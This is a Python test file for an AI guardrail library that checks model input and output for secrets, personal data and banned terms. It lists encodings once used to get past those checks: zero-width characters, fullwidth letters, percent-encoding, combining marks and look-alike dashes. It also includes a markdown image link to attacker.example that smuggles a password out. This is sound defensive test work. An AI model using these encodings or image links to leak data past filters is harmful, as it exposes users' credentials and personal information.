"""The normalised view, its way back to the source, and the bypasses it closes.

Every case under "bypasses" was an `allow` from the whole output chain before
the checks matched over this view, and each is a corpus case too, so the
published rows pay for any of them reopening.
"""

from __future__ import annotations

import pytest
from hypothesis import given
from hypothesis import strategies as st

from jamjet_guardrails import build_chain
from jamjet_guardrails._normalise import fold_character, matched_both_ways, normalise
from jamjet_guardrails.detectors.injection_structural import _DEFAULT_IGNORABLE
from jamjet_guardrails.detectors.pii import PiiGuardrail
from jamjet_guardrails.detectors.secrets import SecretsGuardrail
from jamjet_guardrails.types import Context

OUT = Context(direction="output", origin="model")
IN = Context(direction="input", origin="user")

_FULLWIDTH_CARD = "\u3000".join(["\uff14\uff11\uff11\uff11"] + ["\uff11" * 4] * 3)
GHP = "ghp_0000EXAMPLEONLY0000notarealtoken0000"
AKIA = "AKIAIOSFODNN7EXAMPLE"
ZWSP = "\u200b"
_IGNORABLE = [chr(p) for low, high in _DEFAULT_IGNORABLE for p in range(low, high + 1)]


def _fullwidth(text: str) -> str:
    return "".join(chr(ord(c) + 0xFEE0) if "!" <= c <= "~" else c for c in text)


# --- the view and its map ------------------------------------------------------


def test_ascii_without_a_percent_is_its_own_view() -> None:
    view = normalise("token " + GHP)
    assert view.identity
    assert view.text == "token " + GHP


def test_a_deleted_character_inside_a_match_is_inside_the_span() -> None:
    content = "x ghp_" + ZWSP + "abc y"
    view = normalise(content)
    assert view.text == "x ghp_abc y"
    start = view.text.index("ghp_")
    assert view.span(start, start + 7) == (2, 10)


def test_a_deleted_character_just_outside_a_match_is_outside_the_span() -> None:
    content = ZWSP + "abc" + ZWSP
    view = normalise(content)
    assert view.text == "abc"
    assert view.span(0, 3) == (1, 4)


def test_a_percent_triplet_maps_back_whole_at_either_end_of_a_span() -> None:
    content = "%41KIA%5F"
    view = normalise(content)
    assert view.text == "AKIA_"
    assert view.span(0, 5) == (0, 9)
    assert view.span(0, 1) == (0, 3)
    assert view.span(4, 5) == (6, 9)


def test_a_multi_byte_percent_sequence_is_one_character_and_folds() -> None:
    # %E2%80%8B is U+200B, which reads as nothing once decoded.
    assert normalise("ghp_ab%E2%80%8Bcd").text == "ghp_abcd"
    # %EF%BC%A1 is U+FF21 FULLWIDTH A, which reads as A.
    view = normalise("x%EF%BC%A1y")
    assert view.text == "xAy"
    assert view.span(1, 2) == (1, 10)


@pytest.mark.parametrize(
    "content",
    ["%0A", "%00", "%7F", "%C2%85", "%02d", "%ZZ", "%E2%80", "%C0%AF", "100%"],
)
def test_controls_and_malformed_sequences_stay_encoded(content: str) -> None:
    assert normalise(content).text == content


def test_one_level_only() -> None:
    assert normalise("%2541").text == "%41"


def test_an_expanding_fold_maps_every_product_to_its_one_source() -> None:
    content = "aﬁb"  # LATIN SMALL LIGATURE FI
    view = normalise(content)
    assert view.text == "afib"
    assert view.span(2, 3) == (1, 2)
    assert view.span(0, 4) == (0, 3)


def test_every_default_ignorable_code_point_reads_as_nothing() -> None:
    assert [c for c in _IGNORABLE if fold_character(c)] == []


def test_no_code_point_folds_to_anything_invisible() -> None:
    ignorable = set(_IGNORABLE)
    fold = fold_character.__wrapped__
    leaked = [
        hex(point)
        for point in range(0x110000)
        if not 0xD800 <= point <= 0xDFFF and ignorable & set(fold(chr(point)))
    ]
    assert leaked == []


def test_text_already_in_nfkc_is_not_rewritten() -> None:
    content = "東京で会議。Привет, мир. مرحبا"
    assert normalise(content).identity


@given(
    prefix=st.text(max_size=20),
    suffix=st.text(max_size=20),
    data=st.data(),
)
def test_a_span_always_covers_the_source_that_produced_it(
    prefix: str, suffix: str, data: st.DataObject
) -> None:
    content = prefix + suffix
    view = normalise(content)
    if not view.text:
        return
    start = data.draw(st.integers(0, len(view.text) - 1))
    end = data.draw(st.integers(start + 1, len(view.text)))
    source_start, source_end = view.span(start, end)
    assert 0 <= source_start < source_end <= len(content)
    # Normalising the source span again reproduces at least the matched text.
    assert view.text[start:end] in normalise(content[source_start:source_end]).text


# --- the union -----------------------------------------------------------------


def test_the_union_drops_a_raw_match_contained_in_the_view_match() -> None:
    def scan(text: str) -> list[tuple[str, tuple[int, int]]]:
        position = text.find("abcd")
        if position >= 0:
            return [("T", (position, position + 4))]
        position = text.find("ab")
        return [("T", (position, position + 2))] if position >= 0 else []

    assert matched_both_ways("ab" + ZWSP + "cd", scan) == [("T", (0, 5))]


# --- the bypasses --------------------------------------------------------------


@pytest.mark.parametrize(
    ("content", "covered"),
    [
        ("token " + GHP[:20] + ZWSP + GHP[20:] + " pushed", GHP[:20] + ZWSP + GHP[20:]),
        ("key " + _fullwidth(AKIA), _fullwidth(AKIA)),
        ("token " + GHP.replace("_", "%5F") + " pushed", GHP.replace("_", "%5F")),
        ("key " + AKIA[:4] + "\u2060" + AKIA[4:], AKIA[:4] + "\u2060" + AKIA[4:]),
        ("key " + AKIA[:8] + "\u202e" + AKIA[8:], AKIA[:8] + "\u202e" + AKIA[8:]),
        ("key " + AKIA[:10] + "\u00ad" + AKIA[10:], AKIA[:10] + "\u00ad" + AKIA[10:]),
    ],
)
def test_secrets_sees_through_what_a_reader_does_not_see(content: str, covered: str) -> None:
    verdict = SecretsGuardrail().check(content, OUT)
    assert verdict.decision == "redact"
    start = content.index(covered)
    assert [f.span for f in verdict.findings] == [(start, start + len(covered))]
    assert verdict.content is not None
    assert covered not in verdict.content


@pytest.mark.parametrize(
    ("content", "covered", "kind"),
    [
        (
            "card 4111" + ZWSP + " 1111 1111 1111 on file",
            "4111" + ZWSP + " 1111 1111 1111",
            "CREDIT_CARD",
        ),
        (
            "card 41" + ZWSP + "11 1111 1111 1111 on file",
            "41" + ZWSP + "11 1111 1111 1111",
            "CREDIT_CARD",
        ),
        ("mail alice%40corp.com today", "alice%40corp.com", "EMAIL"),
        ("mail alice＠corp.com today", "alice＠corp.com", "EMAIL"),
        ("ssn 123-45" + ZWSP + "-6789 on file", "123-45" + ZWSP + "-6789", "US_SSN"),
        (
            "card " + _FULLWIDTH_CARD + " on file",
            _FULLWIDTH_CARD,
            "CREDIT_CARD",
        ),
        (
            "card 4111\u00a01111\u00a01111\u00a01111 on file",
            "4111\u00a01111\u00a01111\u00a01111",
            "CREDIT_CARD",
        ),
    ],
)
def test_pii_sees_through_what_a_reader_does_not_see(content: str, covered: str, kind: str) -> None:
    verdict = PiiGuardrail().check(content, OUT)
    assert verdict.decision == "redact"
    start = content.index(covered)
    assert [(f.type, f.span) for f in verdict.findings] == [(kind, (start, start + len(covered)))]


@pytest.mark.parametrize(
    "content",
    [
        "token " + GHP[:20] + ZWSP + GHP[20:] + " pushed",
        "card 4111" + ZWSP + " 1111 1111 1111 on file",
        "key " + _fullwidth(AKIA),
        "mail alice%40corp.com today",
    ],
)
@pytest.mark.parametrize("context", [IN, OUT])
def test_the_whole_default_chain_no_longer_allows_them(content: str, context: Context) -> None:
    chain = build_chain(
        [
            "confusables",
            "encoded-content",
            "injection-structural",
            "pii",
            "secrets",
            "template-integrity",
            "url-exfiltration",
        ]
    )
    assert chain.run(content, context).decision != "allow"


# --- what must stay quiet --------------------------------------------------------


@pytest.mark.parametrize(
    "content",
    [
        "２０２６年１１月７日に東京で会議があります。ＡＩモデルの評価は第３四半期です。",
        "電話は０３－１２３４－５６７８、内線は１２３です。",
        "ｈｅｌｌｏ\u3000ｗｏｒｌｄ、ＩＤは１２３４５です",
        "https://example.com/search?q=rust%20async%20traits&page=2",
        "download my%5Ffile%5Fv2.txt from the share",
        "progress 100%, then 50%DE and 20%2C done",
        'printf("%02d:%02d", h, m) and %4d columns',
        "the word\u200bbreak hint and a soft\u00adhyphen in prose",
    ],
)
def test_ordinary_text_stays_an_allow(content: str) -> None:
    for guardrail in (SecretsGuardrail(), PiiGuardrail()):
        assert guardrail.check(content, OUT).decision == "allow", (guardrail.name, content)


# --- url-exfiltration reads a payload the way its receiver does ------------------

_PROSE = "the user said their account password is hunter two and the pin is four"


@pytest.mark.parametrize(
    "payload",
    [
        _fullwidth(_PROSE).replace(" ", "%20"),
        "".join(f"%{byte:02X}" for byte in _fullwidth(_PROSE).replace(" ", "\u3000").encode()),
        ZWSP.join(_PROSE).replace(" ", "%20"),
    ],
    ids=["fullwidth", "fullwidth-percent-encoded", "zero-width-between-letters"],
)
def test_an_image_url_carrying_prose_a_reader_cannot_see_is_still_prose(payload: str) -> None:
    from jamjet_guardrails.detectors.url_exfiltration import UrlExfiltrationGuardrail

    content = f"![x](https://attacker.example/p.png?d={payload})"
    verdict = UrlExfiltrationGuardrail().check(content, OUT)
    assert [f.type for f in verdict.findings] == ["MARKDOWN_IMAGE_EXFIL"]
    assert verdict.decision == "deny"


# --- rules: the authoring primitive reads what a reader sees too --------------------


@pytest.mark.parametrize(
    ("content", "covered"),
    [
        ("deck for project blu" + ZWSP + "ebird", "project blu" + ZWSP + "ebird"),
        ("deck for " + _fullwidth("project bluebird"), _fullwidth("project bluebird")),
        ("deck for project\u00a0bluebird", "project\u00a0bluebird"),
    ],
)
def test_a_banned_substring_is_matched_through_what_a_reader_does_not_see(
    content: str, covered: str
) -> None:
    from jamjet_guardrails import PatternGuardrail

    guardrail = PatternGuardrail(name="r", version="1", banned={"B": ["project bluebird"]})
    verdict = guardrail.check(content, OUT)
    assert verdict.decision == "deny"
    start = content.index(covered)
    assert [f.span for f in verdict.findings] == [(start, start + len(covered))]


def test_a_pattern_is_matched_through_what_a_reader_does_not_see() -> None:
    from jamjet_guardrails import PatternGuardrail

    guardrail = PatternGuardrail(name="r", version="1", patterns={"T": r"\bJIRA-\d{4,}\b"})
    for content in ("see JIRA" + ZWSP + "-1234 now", "see " + _fullwidth("JIRA-1234") + " now"):
        assert guardrail.check(content, OUT).decision == "deny", content


def test_a_rule_naming_an_invisible_character_still_matches_it() -> None:
    from jamjet_guardrails import PatternGuardrail

    guardrail = PatternGuardrail(
        name="r", version="1", banned={"ZW": [ZWSP]}, patterns={"BOM": "\ufeff"}
    )
    verdict = guardrail.check("a" + ZWSP + "b\ufeff", OUT)
    assert sorted(f.span for f in verdict.findings if f.span is not None) == [(1, 2), (3, 4)]


def test_confusable_folding_stays_off_by_default_because_it_costs_precision() -> None:
    """`skeleton` folds `m` to `rn`, so banning "corn" with it on denies every `.com`.

    That is why the published `rules` row is measured with it OFF, the default,
    and why the default is not flipped to match the old row instead.
    """
    from jamjet_guardrails import PatternGuardrail

    default = PatternGuardrail(name="r", version="1", banned={"B": ["corn"]})
    folding = PatternGuardrail(name="r", version="1", banned={"B": ["corn"]}, fold_confusables=True)
    assert default.check("see example.com", OUT).decision == "allow"
    assert folding.check("see example.com", OUT).decision == "deny"


def test_confusable_folding_sees_through_an_invisible_character_too() -> None:
    from jamjet_guardrails import PatternGuardrail

    guardrail = PatternGuardrail(
        name="r", version="1", banned={"B": ["project bluebird"]}, fold_confusables=True
    )
    content = "deck for prоject blu" + ZWSP + "ebіrd"
    verdict = guardrail.check(content, OUT)
    assert [f.span for f in verdict.findings] == [(9, len(content))]


# --- a space-separated SSN ----------------------------------------------------------


@pytest.mark.parametrize(
    "content",
    [
        "ssn 123 45 6789 on file",
        "ssn 123\u00a045\u00a06789 on file",
        "ssn 123 45" + ZWSP + " 6789 on file",
    ],
)
def test_a_space_separated_ssn_is_redacted(content: str) -> None:
    verdict = PiiGuardrail().check(content, OUT)
    assert [(f.type, f.span) for f in verdict.findings] == [("US_SSN", (4, len(content) - 8))]


@pytest.mark.parametrize(
    "content",
    [
        "area 000 12 3456 is never issued",
        "area 666 12 3456 is never issued",
        "area 900 12 3456 is never issued",
        "group 123 00 4567 is never issued",
        "serial 123 45 0000 is never issued",
        "sizes 10 512 64 1024 2048 in one row",
        "ssn 123456789 on file",
    ],
)
def test_the_spaced_form_keeps_the_ssa_issuance_rules(content: str) -> None:
    assert PiiGuardrail().check(content, OUT).decision == "allow"


# --- review round: marks, dashes, stops, newlines, scale, zero width ---------------

_GH_MARKED = GHP[:12] + "̣" + GHP[12:20] + "́" + GHP[20:]
_GH_STRUCK = "".join(c + "̶" for c in GHP)


@pytest.mark.parametrize(
    ("content", "covered", "kind"),
    [
        ("token " + _GH_MARKED, _GH_MARKED, "GITHUB_TOKEN"),
        ("token " + _GH_STRUCK + " here", _GH_STRUCK, "GITHUB_TOKEN"),
        (
            "key sk‑ant‑api03‑EXAMPLEONLY0000notarealtoken0000",
            "sk‑ant‑api03‑EXAMPLEONLY0000notarealtoken0000",
            "ANTHROPIC_KEY",
        ),
        (
            "key sk−proj−0000EXAMPLEONLY0000notarealtoken0000abcd",
            "sk−proj−0000EXAMPLEONLY0000notarealtoken0000abcd",
            "OPENAI_KEY",
        ),
        (
            "bot xoxb–EXAMPLEONLY–notarealtoken–ac–0000000000",
            "xoxb–EXAMPLEONLY–notarealtoken–ac–0000000000",
            "SLACK_TOKEN",
        ),
    ],
)
def test_secrets_reads_through_marks_and_dashes(content: str, covered: str, kind: str) -> None:
    verdict = SecretsGuardrail().check(content, OUT)
    start = content.index(covered)
    assert [(f.type, f.span) for f in verdict.findings] == [(kind, (start, start + len(covered)))]


@pytest.mark.parametrize(
    ("content", "covered", "kind"),
    [
        ("card 4111‑1111‑1111‑1111 on file", "4111‑1111‑1111‑1111", "CREDIT_CARD"),
        ("ssn 123‑45‑6789 on file", "123‑45‑6789", "US_SSN"),
        ("call 555–123–4567 today", "555–123–4567", "PHONE_NUMBER"),
        ("mail alice@corp。com today", "alice@corp。com", "EMAIL"),
        ("mail alice@corp｡com today", "alice@corp｡com", "EMAIL"),
    ],
)
def test_pii_reads_through_dashes_and_ideographic_stops(
    content: str, covered: str, kind: str
) -> None:
    verdict = PiiGuardrail().check(content, OUT)
    start = content.index(covered)
    assert [(f.type, f.span) for f in verdict.findings] == [(kind, (start, start + len(covered)))]


@pytest.mark.parametrize(
    "content",
    [
        "連絡は@tanaka。よろしくお願いします",
        "pages 12–34, the 1990–2000 range, and 3−4",
        "Tiếng Việt có dấu",
        "東京〜大阪 1〜3日",
    ],
)
def test_the_new_folds_leave_ordinary_text_alone(content: str) -> None:
    for guardrail in (SecretsGuardrail(), PiiGuardrail()):
        assert guardrail.check(content, OUT).decision == "allow", (guardrail.name, content)


def test_a_token_split_by_a_line_break_is_a_disclosed_miss() -> None:
    """Joining lines would join every line of a PEM body; `sec-0180` labels it."""
    assert SecretsGuardrail().check("token " + GHP[:20] + "\n" + GHP[20:], OUT).decision == "allow"


def test_a_view_of_dense_fullwidth_text_needs_no_map() -> None:
    """A one-for-one replacement moves no offset, so a megabyte of it maps for free.

    The first version of the map held an object per changed character, and a
    megabyte of fullwidth letters cost 321 MB and 666 ms in `secrets`.
    """
    content = "Ａ" * 100_000
    view = normalise(content, True)
    assert view.text == "A" * 100_000
    assert len(view.view_starts) == 0
    alternating = "a\u200b" * 50_000
    assert len(normalise(alternating, True).view_starts) == 50_000
    assert len(normalise("\u200b" * 50_000, True).view_starts) == 1


def test_the_view_is_built_once_per_content() -> None:
    content = "token " + GHP[:20] + ZWSP + GHP[20:]
    assert normalise(content, True) is normalise(content, True)


def test_content_over_the_cap_is_refused_rather_than_allowed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from jamjet_guardrails import _normalise
    from jamjet_guardrails.errors import GuardrailUnavailableError

    monkeypatch.setattr(_normalise, "MAX_CHARS", 64)
    _normalise.forget_views()
    content = "x" * 60 + "é" * 10
    with pytest.raises(GuardrailUnavailableError):
        SecretsGuardrail().check(content, OUT)
    chain = build_chain(["secrets"])
    assert chain.run(content, OUT).decision == "deny"
    _normalise.forget_views()


def test_a_rule_that_can_match_empty_does_not_raise_on_non_ascii_content() -> None:
    from jamjet_guardrails import PatternGuardrail

    guardrail = PatternGuardrail(name="r", version="1", patterns={"Z": r"\ba*"})
    verdict = guardrail.check("café \u200bx", OUT)
    assert all(f.span is not None and f.span[0] == f.span[1] for f in verdict.findings)


# --- second review round: cost bounds, cache scope, more hyphens ---------------------


def _resizing_pool() -> list[str]:
    from jamjet_guardrails._normalise import fold_character as fold

    return [
        chr(point)
        for point in [*range(0x2460, 0x24A0), *range(0x3300, 0x3400), *range(0xFB00, 0xFB07)]
        if len(fold(chr(point), True)) != 1
    ]


def test_long_runs_of_distinct_resizing_characters_stay_linear() -> None:
    """Each 17-character run draws a different set of length-changing code points.

    The version this guards compiled a character class per such run, and the
    attacker chooses the sets, so its cache never hit: 10.7 seconds a megabyte
    in `secrets`. Walked with the folds the run already has, it is linear.
    """
    import random
    import time

    rng = random.Random(7)
    pool = _resizing_pool()
    assert len(pool) > 100, "the pool must be large enough that sets do not repeat"
    content = " ".join("".join(rng.choice(pool) for _ in range(17)) for _ in range(14_000))
    start = time.perf_counter()
    SecretsGuardrail().check(content, OUT)
    elapsed = time.perf_counter() - start
    assert elapsed < 1.0, f"{len(content)} characters took {elapsed:.2f} s"


def test_korean_and_precomposed_vietnamese_need_no_edits() -> None:
    korean = "한국어 문장을 읽습니다 " * 200
    view = normalise(korean, True)
    assert view.text == korean and len(view.view_starts) == 0
    vietnamese = "Tiếng Việt là ngôn ngữ " * 200
    view = normalise(vietnamese, True)
    assert len(view.view_starts) == 0
    assert view.text.startswith("Tieng Viet la ngon ngu ")


def test_url_components_do_not_evict_the_content_view() -> None:
    from jamjet_guardrails._normalise import _memoised, forget_views
    from jamjet_guardrails.detectors.url_exfiltration import UrlExfiltrationGuardrail

    forget_views()
    content = "![p](https://cdn.example.com/a/b%20c/d.png?x=caf%C3%A9&z=%E2%80%8B) \u200b " * 3
    UrlExfiltrationGuardrail().check(content, OUT)
    assert _memoised.cache_info().currsize == 0


def test_a_str_subclass_is_never_served_another_strings_view() -> None:
    from jamjet_guardrails._normalise import forget_views

    forget_views()
    first = "x\u200by"
    normalise(first, True)

    class Hostile(str):
        def __hash__(self) -> int:
            return hash(first)

        def __eq__(self, other: object) -> bool:
            return True

    other = Hostile("ghp\u200b_" + "B" * 36)
    assert normalise(other, True).text == "ghp_" + "B" * 36
    forget_views()


def test_a_chain_run_does_not_keep_its_content_in_the_cache() -> None:
    from jamjet_guardrails._normalise import _memoised

    chain = build_chain(["secrets", "url-exfiltration", "pii"])
    chain.run("token " + GHP[:20] + ZWSP + GHP[20:], OUT)
    assert _memoised.cache_info().currsize == 0


@pytest.mark.parametrize("hyphen", ["⁃", "˗", "➖", "─"])
def test_characters_drawn_as_a_hyphen_read_as_one(hyphen: str) -> None:
    ssn = f"123{hyphen}45{hyphen}6789"
    assert [f.type for f in PiiGuardrail().check(f"ssn {ssn} on file", OUT).findings] == ["US_SSN"]
    key = f"sk{hyphen}ant{hyphen}api03{hyphen}EXAMPLEONLY0000notarealtoken0000"
    assert [f.type for f in SecretsGuardrail().check(f"key {key}", OUT).findings] == [
        "ANTHROPIC_KEY"
    ]


@pytest.mark.parametrize("letter", ["ー", "一"])
def test_cjk_letters_that_look_like_a_hyphen_are_a_disclosed_miss(letter: str) -> None:
    """Letters in Japanese and Chinese text; `pii-0109` and `pii-0110` label them."""
    content = f"ssn 123{letter}45{letter}6789 on file"
    assert PiiGuardrail().check(content, OUT).decision == "allow"


def test_the_size_cap_applies_only_where_a_view_is_built(monkeypatch: pytest.MonkeyPatch) -> None:
    from jamjet_guardrails import _normalise

    monkeypatch.setattr(_normalise, "MAX_CHARS", 64)
    _normalise.forget_views()
    assert SecretsGuardrail().check("plain ascii " * 20, OUT).decision == "allow"
    _normalise.forget_views()
